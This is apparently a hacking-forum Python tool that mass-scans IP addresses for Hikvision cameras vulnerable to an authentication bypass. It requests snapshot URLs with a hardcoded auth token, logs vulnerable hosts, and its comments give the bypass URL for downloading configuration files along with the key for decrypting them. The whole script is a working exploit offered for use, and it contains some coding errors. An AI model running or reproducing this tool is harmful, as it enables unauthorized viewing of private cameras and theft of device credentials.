import requests
from multiprocessing.pool import ThreadPool
from functools import partial
import time, urllib

# made by https://raidforums.com/User-bWlsbGVy

opener=urllib.request.build_opener()
opener.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582')]
urllib.request.install_opener(opener)

print('''██   ██ ██ ██   ██ ██    ██ ██ ███████ ██  ██████  ███    ██      ██████ ██   ██ ███████  ██████ ██   ██ ███████ ██████
██   ██ ██ ██  ██  ██    ██ ██ ██      ██ ██    ██ ████   ██     ██      ██   ██ ██      ██      ██  ██  ██      ██   ██
███████ ██ █████   ██    ██ ██ ███████ ██ ██    ██ ██ ██  ██     ██      ███████ █████   ██      █████   █████   ██████
██   ██ ██ ██  ██   ██  ██  ██      ██ ██ ██    ██ ██  ██ ██     ██      ██   ██ ██      ██      ██  ██  ██      ██   ██
██   ██ ██ ██   ██   ████   ██ ███████ ██  ██████  ██   ████      ██████ ██   ██ ███████  ██████ ██   ██ ███████ ██   ██


''')

# HIK CAMERA INFO
#
# http://camera_ip/System/configurationFile?auth=YWRtaW46MTEK
#
# The config is encrypted with aes-128-ecb and XOR
#
#
# openssl enc -d -in configurationFile -out decryptedoutput -aes-128-ecb -K 73 8B 5544 -nosalt -md md5
#
# The output file then needs to be XOR-decrypted with 73 8B 55 44 as key.


with open('Servers.txt') as f:
    servers = [line.rstrip() for line in f]
    f.close()


def login(session, server):
    url = f'http://{server}/onvif-http/snapshot?auth=YWRtaW46MTEK'
    try:
        response = requests.get(url)
    except:
        print('   [ ~ ] Connection to '+server+' failed! Moving on.')

    # Server response
    a = ['404','401']

    a_match = [True for match in a if match in str(response)]

    # If 404 or 401 is in response
    if True in a_match:
      print(f'   [ * ] Server '+{servers}+' is patched!'+(str(response)))
    else:
        # Opens saved.txt and writes server URL
        with open('Saved.txt', "a") as f:
            f.write(url+'\n')
            f.close()
        print('\n   [ ! ] Server '+server+' is vulnrable!   '+(str(response))+'\n')

if __name__ == "__main__":
    # creating a pool object
    with ThreadPool(min(len(servers), 5000)) as pool, \
    requests.Session() as session:
        # map will return list of None since `login` returns None implicitly:
        try:
            pool.map(partial(login, session), servers)
        except:
            print('\n\n   [ * ] Job finished!')
            with open('Saved.txt', "a") as f:
                f.write('\n')
